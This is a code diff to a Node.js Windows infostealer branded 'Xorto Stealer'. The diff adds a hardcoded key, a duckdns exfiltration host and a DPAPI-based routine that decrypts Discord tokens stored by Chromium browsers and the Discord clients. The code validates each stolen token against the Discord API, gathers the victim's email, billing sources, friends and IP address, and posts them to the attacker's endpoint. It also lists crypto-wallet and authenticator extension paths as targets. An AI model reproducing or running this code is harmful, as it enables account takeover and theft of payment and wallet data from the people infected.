@@ -9,6 +9,7 @@ const crypto = require('crypto');
 const sqlite3 = require('sqlite3');
 const { extractAll, createPackage } = require('asar');
 const https = require('https');
+const { Dpapi } = require('@primno/dpapi');
 
 
 const local = process.env.LOCALAPPDATA;
@@ -22,7 +23,9 @@ var appdata = process.env.APPDATA,
     localappdata = process.env.LOCALAPPDATA;
 let browser_paths = [localappdata + '\\Google\\Chrome\\User Data\\Default\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\', appdata + '\\Opera Software\\Opera Stable\\', appdata + '\\Opera Software\\Opera GX Stable\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'];
 
-const key = "yourkey"
+const key = "bhuaE96bVIxno4QY"
+const api_url = "xortoproject1.duckdns.org";
+
 paths = [appdata + '\\discord\\', appdata + '\\discordcanary\\', appdata + '\\discordptb\\', appdata + '\\discorddevelopment\\', appdata + '\\lightcord\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\', appdata + '\\Opera Software\\Opera Stable\\', appdata + '\\Opera Software\\Opera GX Stable\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\']
 
 
@@ -155,7 +158,6 @@ _0x4ae424.Authenticator_E =
     '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio'
 _0x4ae424.MetaMask_O =
     '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'
-const api_url = "xortoproject1.duckdns.org";
 
 const extension = _0x4ae424,
   browserPath = [
@@ -924,216 +926,250 @@ async function getZippp() {
   form.submit(webhook)
 }
 //
-const tokens = [];
-async function findToken(path) {
-    let path_tail = path;
-    path += 'Local Storage\\leveldb';
 
-    if (!path_tail.includes('discordd')) {
-        try {
-            fs.readdirSync(path)
-                .map(file => {
-                    (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
-                        .split(/\r?\n/)
-                        .forEach(line => {
-                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
-                            for (const pattern of patterns) {
-                                const foundTokens = line.match(pattern);
-                                if (foundTokens) foundTokens.forEach(token => {
-                                    if (!tokens.includes(token)) tokens.push(token)
-                                });
-                            }
-                        });
-                });
-        } catch (e) { }
-        return;
-    } else {
-        if (fs.existsSync(path_tail + '\\Local State')) {
-            try {
-     const tokenRegex = /([A-Za-z\d]{24})\.([\w-]{6})\.([\w-]{27})/;
+const decryptKey = (localState) => {
+  const encryptedKey = JSON.parse(fs.readFileSync(localState, 'utf8')).os_crypt.encrypted_key;
+  const encrypted = Buffer.from(encryptedKey, 'base64').slice(5);
+  return Dpapi.unprotectData(Buffer.from(encrypted, 'utf8'), null, 'CurrentUser');
+};
+
+function findTokenn(path) {
+	path += 'Local Storage\\leveldb';
+	let tokens = [];
+	try {
+		fs.readdirSync(path)
+			.map(file => {
+				(file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
+					.split(/\r?\n/)
+					.forEach(line => {
+						const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
+						for (const pattern of patterns) {
+							const foundTokens = line.match(pattern);
+							if (foundTokens) foundTokens.forEach(token => tokens.push(token));
+						}
+					});
+			});
+	} catch (e) {}
+	return tokens;
+}
+
+const tokens = [];
+
+async function findToken(path) {
+	let path_tail = path;
+	path += 'Local Storage\\leveldb';
+
+	if (!path_tail.includes('discord')) {
+		try {
+			fs.readdirSync(path)
+				.map(file => {
+					(file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
+						.split(/\r?\n/)
+						.forEach(line => {
+						const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
+							for (const pattern of patterns) {
+								const foundTokens = line.match(pattern);
+								if (foundTokens) foundTokens.forEach(token => {
+									if (!tokens.includes(token)) tokens.push(token)
+								});
+							}
+						});
+				});
+		} catch (e) { }
+		return;
+	} else {
+		if (fs.existsSync(path_tail + '\\Local State')) {
+			try {
+	 const tokenRegex = /dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi;
 
 fs.readdirSync(path).forEach(file => {
-    if (file.endsWith('.log') || file.endsWith('.ldb')) {
-        const fileContent = fs.readFileSync(`${path}\\${file}`, 'utf8');
-        const lines = fileContent.split(/\r?\n/);
+	if (file.endsWith('.log') || file.endsWith('.ldb')) {
+		const fileContent = fs.readFileSync(`${path}\\${file}`, 'utf8');
+		const lines = fileContent.split(/\r?\n/);
 
-        lines.forEach(line => {
-            const foundTokens = line.match(tokenRegex);
+		const localStatePath = path_tail+'\Local State'
+		const key = decryptKey(localStatePath);
 
-            if (foundTokens) {
-                foundTokens.forEach(token => {
-                    const encryptedKey = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5);
-                    const key = dpapi.unprotectData(Buffer.from(encryptedKey, 'utf-8'), null, 'CurrentUser');
-                    const tokenParts = token.split('.');
-                    const start = Buffer.from(tokenParts[0], 'base64');
-                    const middle = Buffer.from(tokenParts[1], 'base64');
-                    const end = Buffer.from(tokenParts[2], 'base64');
-                    const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
-                    decipher.setAuthTag(end);
-                    const out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
-                    
-                    if (!tokens.includes(out)) {
-                        tokens.push(out);
-                    }
-                });
-            }
-        });
-    }
+		lines.forEach(line => {
+			const foundTokens = line.match(tokenRegex);
+			if (foundTokens) {
+				foundTokens.forEach(token => {
+					let decrypted;
+					const encryptedValue = Buffer.from(token.split(':')[1], 'base64');
+					const start = encryptedValue.slice(3, 15);
+					const middle = encryptedValue.slice(15, encryptedValue.length - 16);
+					const end = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
+					const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
+					decipher.setAuthTag(end);
+					decrypted = decipher.update(middle, 'base64', 'utf8') + decipher.final('utf8');
+					if (!tokens.includes(decrypted)) tokens.push(decrypted)
+				});
+			}
+		});
+	}
 });
 
-            } catch (e) { }
-            return;
-        }
-    }
+			} catch (e) { }
+			return;
+		}
+	}
 }
 
 
 async function stealTokens() {
-    for (let path of paths) {
-        await findToken(path);
-    }
+	for (let path of paths) {
+		await findToken(path);
+	}
 
-    for (let token of tokens) {
-        try {
-            let json;
-            await axios.get("https://discord.com/api/v9/users/@me", {
-                headers: {
-                    "Content-Type": "application/json",
-                    "authorization": token
-                }
-            }).then(res => { json = res.data }).catch(() => { json = null });
-
-            if (!json) continue;
-
-            var ip = await getIp();
-            var billing = await getBilling(token);
+	for (let token of tokens) {	
+		try {
+			let json;
+			await axios.get("https://discord.com/api/v6/users/@me", {
+				headers: {
+					"Content-Type": "application/json",
+					"authorization": token
+				}
+			}).then(res => { json = res.data}).catch(() => { json = null });
+			if (!json) continue;
+			var ip = await getIp();
+			var billing = await getBilling(token);
             var friends = await getRelationships(token);
 
-            const userInformationEmbed = {
-                title: "User Information",
-                color: 2895667, 
-                author: {
-                    name: `${json.username}#${json.discriminator} (${json.id})`,
-                    icon_url: "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif"
-                },
-                thumbnail: {
-                    url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
-                },
-                fields: [
-                    {
-                        name: "<:hackerblack:1095747410539593800> Token:",
-                        value: `\`${token}\`\n[Copy Token](https://redroseproject.xyz/copy/${token})`
-                    },
-                    {
-                        name: "<a:blackhypesquad:1095742323423453224> Badges:",
-                        value: getBadges(json.flags),
-                        inline: true
-                    },
-                    {
-                        name: "<a:blackhypesquad:1095742323423453224> Nitro Type:",
-                        value: await getNitro(json.premium_type, json.id, token),
-                        inline: true
-                    },
-                    {
-                        name: "<a:blackmoneycard:1095741026850852965> Billing:",
-                        value: billing,
-                        inline: true
-                    },
-                    {
-                        name: "<:mail:1095741024678191114> Email:",
-                        value: `\`${json.email}\``,
-                        inline: true
-                    },
-                    {
-                        name: "<a:blackworld:1095741984385290310> IP:",
-                        value: `\`${ip}\``,
-                        inline: true
-                    }
-                ]
-            };
+			const randomString = crypto.randomBytes(16).toString('hex');
 
-            const friendsEmbed = {
-                title: "Friends",
-                color: 0xE74C3C, 
-                description: friends,
-                author: {
-                    name: "HQ Friends",
-                    icon_url: "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif"
-                },
-                footer: {
-                    text: "@Xorto Project"
-                }
-            };
+		
+			const userInformationEmbed = {
+				color: 0x2b2d31,
+				author: {
+					name: `${json.username} (${json.id})`,
+					icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`,
+				},
+				thumbnail: {
+					url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
+				},
+				fields: [
+					{
+						name: "<a:money:1211376962241568790> Token:",
+						value: `\`${token}\``
+					},
+					{
+						name: "<:skull:1223079288786653254> Badges:",
+						value: getBadges(json.flags),
+						inline: true
+					},
+					{
+						name: "<:japan:1223077879990980739> Nitro Type:",
+						value: await getNitro(json.premium_type, json.id, token),
+						inline: true
+					},
+					{
+						name: "<:butterfly:1223077684075036683> Billing:",
+						value: billing,
+						inline: true
+					},
+		
+					{
+						name: "<:japan:1223077879990980739> Email:",
+						value: `\`${json.email}\``,
+						inline: true
+					},
+					{
+						name: "<:skull:1223079288786653254> IP:",
+						value: `\`${ip}\``,
+						inline: true
+					},
 
-            const data = {
-                embeds: [userInformationEmbed, friendsEmbed], 
-                key: key
-            };
+				],
+				footer: {
+					text: "Xorto Stealer | t.me/xortoproject",
+					icon_url: `https://media.discordapp.net/attachments/1244400566612791387/1255865042788683786/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=667eaef7&is=667d5d77&hm=61132b36f95f04d96a142c3a3822a866ea49d3bfc78d514bfa1d96c558347f0f&=&format=webp&quality=lossless&width=600&height=600`,
+				}
+			};
 
-            await axios.post(`${api_url}/webhooks/${randomString}`, data);
-        } catch (error) {
-            console.error(error);
-        }
-    }
+			const friendsEmbed = {
+				color: 0x2b2d31,
+				description: friends,
+				author: {
+					name: `HQ Friends`,
+					icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
+				},
+				
+				footer: {
+					text: "Xorto Stealer | t.me/xortoproject",
+					icon_url: `https://media.discordapp.net/attachments/1244400566612791387/1255865042788683786/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=667eaef7&is=667d5d77&hm=61132b36f95f04d96a142c3a3822a866ea49d3bfc78d514bfa1d96c558347f0f&=&format=webp&quality=lossless&width=600&height=600`,
+				}
+			};
+
+			const data = {
+				embeds: [userInformationEmbed, friendsEmbed], 
+                key: key				
+			}
+
+            axios.post(`${api_url}/webhooks/${randomString}`, data);
+		} catch (error) {
+			console.error(error);
+
+		}
+	}
 }
 
 
 const badges = {
-    Discord_Employee: {
-        Value: 1,
-        Emoji: "<:staff:874750808728666152>",
-        Rare: true,
-    },
-    Partnered_Server_Owner: {
-        Value: 2,
-        Emoji: "<:partner:874750808678354964>",
-        Rare: true,
-    },
-    HypeSquad_Events: {
-        Value: 4,
-        Emoji: "<:hypesquad_events:874750808594477056>",
-        Rare: true,
-    },
-    Bug_Hunter_Level_1: {
-        Value: 8,
-        Emoji: "<:bughunter_1:874750808426692658>",
-        Rare: true,
-    },
-    Early_Supporter: {
-        Value: 512,
-        Emoji: "<:early_supporter:874750808414113823>",
-        Rare: true,
-    },
-    Bug_Hunter_Level_2: {
-        Value: 16384,
-        Emoji: "<:bughunter_2:874750808430874664>",
-        Rare: true,
-    },
-    Early_Verified_Bot_Developer: {
-        Value: 131072,
-        Emoji: "<:developer:874750808472825986>",
-        Rare: true,
-    },
-    House_Bravery: {
-        Value: 64,
-        Emoji: "<:bravery:874750808388952075>",
-        Rare: false,
-    },
-    House_Brilliance: {
-        Value: 128,
-        Emoji: "<:brilliance:874750808338608199>",
-        Rare: false,
-    },
-    House_Balance: {
-        Value: 256,
-        Emoji: "<:balance:874750808267292683>",
-        Rare: false,
-    },
-    Discord_Official_Moderator: {
-        Value: 262144,
-        Emoji: "<:moderator:976739399998001152>",
-        Rare: true,
-    }
+	Discord_Employee: {
+		Value: 1,
+		Emoji: "<:staff:874750808728666152>",
+		Rare: true,
+	},
+	Partnered_Server_Owner: {
+		Value: 2,
+		Emoji: "<:partner:874750808678354964>",
+		Rare: true,
+	},
+	HypeSquad_Events: {
+		Value: 4,
+		Emoji: "<:hypesquad_events:874750808594477056>",
+		Rare: true,
+	},
+	Bug_Hunter_Level_1: {
+		Value: 8,
+		Emoji: "<:bughunter_1:874750808426692658>",
+		Rare: true,
+	},
+	Early_Supporter: {
+		Value: 512,
+		Emoji: "<:early_supporter:874750808414113823>",
+		Rare: true,
+	},
+	Bug_Hunter_Level_2: {
+		Value: 16384,
+		Emoji: "<:bughunter_2:874750808430874664>",
+		Rare: true,
+	},
+	Early_Verified_Bot_Developer: {
+		Value: 131072,
+		Emoji: "<:developer:874750808472825986>",
+		Rare: true,
+	},
+	House_Bravery: {
+		Value: 64,
+		Emoji: "<:bravery:874750808388952075>",
+		Rare: false,
+	},
+	House_Brilliance: {
+		Value: 128,
+		Emoji: "<:brilliance:874750808338608199>",
+		Rare: false,
+	},
+	House_Balance: {
+		Value: 256,
+		Emoji: "<:balance:874750808267292683>",
+		Rare: false,
+	},
+	Discord_Official_Moderator: {
+		Value: 262144,
+		Emoji: "<:moderator:857241458889195571>",
+		Rare: true,
+	}
 };
 
 async function getRelationships(token) {
@@ -1159,133 +1195,172 @@ async function getRelationships(token) {
     return gay
 }
 
-async function getBilling(token) {
-    let json;
-    await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
-        headers: {
-            "Content-Type": "application/json",
-            "authorization": token
-        }
-    }).then(res => { json = res.data })
-        .catch(err => { })
-    if (!json) return '\`Unknown\`';
+async function getBoostEmblem(id, token) {
+    try {
+        let info;
+        await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
+            headers: {
+                "Content-Type": "application/json",
+                "authorization": token
+            }
+        }).then(res => { info = res.data })
+            .catch(() => { })
+        if (!info) return "";
 
-    var bi = '';
-    json.forEach(z => {
-        if (z.type == 2 && z.invalid != !0) {
-            bi += "<:946246524504002610:962747802830655498>";
-        } else if (z.type == 1 && z.invalid != !0) {
-            bi += "<:rustler:987692721613459517>";
+        if (!info.premium_guild_since) return "";
+
+        let boost = ["<:lvl1:1219031125247266887>", "<:lvl2:1219031171942449282>", "<:lvl3:1219031999847858216>", "<:lvl4:1219031250950684763>", "<:lvl5:1219031294176919603>", "<:lvl6:1219031344324022425>", "<:lvl7:1219031400607645816>", "<:lvl8:1219031431280332910>", "<:lvl9:1219031069974724638>"]
+        var i = 0
+
+        let boostPeriods = [2, 3, 6, 9, 12, 15, 18, 24];
+        for (const period of boostPeriods) {
+            let expiryDate = new Date(info.premium_guild_since);
+            expiryDate.setMonth(expiryDate.getMonth() + period);
+            let daysLeft = Math.round((expiryDate - Date.now()) / 86400000);
+            if (daysLeft > 0) {
+                break;
+            } else {
+                i++;
+            }
         }
-    });
-    if (bi == '') bi = `\`No Billing\``
-    return bi;
+
+        if (i >= 4) {
+            return `<:nitro:1227750272915345589>${boost[i]}`;
+        } else {
+            return "";
+        }
+    } catch {
+        return "";
+    }
+}
+
+async function getBilling(token) {
+	let json;
+	await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
+		headers: {
+			"Content-Type": "application/json",
+			"authorization": token
+		}
+	}).then(res => { json = res.data })
+		.catch(err => { })
+	if (!json) return '\`Unknown\`';
+
+	var bi = '';
+	json.forEach(z => {
+		if (z.type == 2 && z.invalid != !0) {
+			bi += "<:946246524504002610:962747802830655498>";
+		} else if (z.type == 1 && z.invalid != !0) {
+			bi += "<:rustler:987692721613459517>";
+		}
+	});
+	if (bi == '') bi = `\`No Billing\``
+	return bi;
 }
 
 function getBadges(flags) {
-    var b = '';
-    for (const prop in badges) {
-        let o = badges[prop];
-        if ((flags & o.Value) == o.Value) b += o.Emoji;
-    };
-    if (b == '') return `\`No Badges\``;
-    return `${b}`;
+	var b = '';
+	for (const prop in badges) {
+		let o = badges[prop];
+		if ((flags & o.Value) == o.Value) b += o.Emoji;
+	};
+	if (b == '') return `\`No Badges\``;
+	return `${b}`;
 }
 
 function getRareBadges(flags) {
-    var b = '';
-    for (const prop in badges) {
-        let o = badges[prop];
-        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
-    };
-    return b;
+	var b = '';
+	for (const prop in badges) {
+		let o = badges[prop];
+		if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
+	};
+	return b;
 }
 
 async function getNitro(flags, id, token) {
-    switch (flags) {
-        case 1:
-            return "<:946246402105819216:962747802797113365>";
-        case 2:
-            let info;
-            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
-                headers: {
-                    "Content-Type": "application/json",
-                    "authorization": token
-                }
-            }).then(res => { info = res.data })
-                .catch(() => { })
-            if (!info) return "<:946246402105819216:962747802797113365>";
+	switch (flags) {
+		case 1:
+			return "<:946246402105819216:962747802797113365>";
+		case 2:
+			let info;
+			await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
+				headers: {
+					"Content-Type": "application/json",
+					"authorization": token
+				}
+			}).then(res => { info = res.data })
+				.catch(() => { })
+			if (!info) return "<:946246402105819216:962747802797113365>";
 
-            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";
+			if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";
 
-            let boost = ["<:boost1month:1161356435360325673>", "<:boost2month:1161356669004030033>", "<:boost3month:1161356821806710844>", "<:boost6month:1161357418480029776>", "<:boost9month:1161357513820741852>", "<:boost12month:1161357639737946206>", "<:boost15month:967518897987256400>", "<:boost18month:967519190133145611>", "<:boost24month:969686081958207508>"]
-            var i = 0
+			let boost = ["<:lvl1:1219031125247266887>", "<:lvl2:1219031171942449282>", "<:lvl3:1219031999847858216>", "<:lvl4:1219031250950684763>", "<:lvl5:1219031294176919603>", "<:lvl6:1219031344324022425>", "<:lvl7:1219031400607645816>", "<:lvl8:1219031431280332910>", "<:lvl9:1219031069974724638>"]
+			var i = 0
 
-            try {
-                let d = new Date(info.premium_guild_since)
-                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
-                let d1 = new Date(info.premium_guild_since)
-                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
-                let d2 = new Date(info.premium_guild_since)
-                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
-                let d3 = new Date(info.premium_guild_since)
-                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
-                let d4 = new Date(info.premium_guild_since)
-                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
-                let d5 = new Date(info.premium_guild_since)
-                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
-                let d6 = new Date(info.premium_guild_since)
-                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
-                let d7 = new Date(info.premium_guild_since)
-                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)
+			try {
+				let d = new Date(info.premium_guild_since)
+				let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
+				let d1 = new Date(info.premium_guild_since)
+				let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
+				let d2 = new Date(info.premium_guild_since)
+				let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
+				let d3 = new Date(info.premium_guild_since)
+				let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
+				let d4 = new Date(info.premium_guild_since)
+				let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
+				let d5 = new Date(info.premium_guild_since)
+				let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
+				let d6 = new Date(info.premium_guild_since)
+				let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
+				let d7 = new Date(info.premium_guild_since)
+				let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)
 
-                if (boost2month > 0) {
-                    i += 0
-                } else {
-                    i += 1
-                } if (boost3month > 0) {
-                    i += 0
-                } else {
-                    i += 1
-                } if (boost6month > 0) {
-                    i += 0
-                } else {
-                    i += 1
-                } if (boost9month > 0) {
-                    i += 0
-                } else {
-                    i += 1
-                } if (boost12month > 0) {
-                    i += 0
-                } else {
-                    i += 1
-                } if (boost15month > 0) {
-                    i += 0
-                } else {
-                    i += 1
-                } if (boost18month > 0) {
-                    i += 0
-                } else {
-                    i += 1
-                } if (boost24month > 0) {
-                    i += 0
-                } else if (boost24month < 0 || boost24month == 0) {
-                    i += 1
-                } else {
-                    i = 0
-                }
-            } catch {
-                i += 0
-            }
-            return `<:946246402105819216:962747802797113365> ${boost[i]}`
-        default:
-            return "\`No Nitro\`";
-    };
+				if (boost2month > 0) {
+					i += 0
+				} else {
+					i += 1
+				} if (boost3month > 0) {
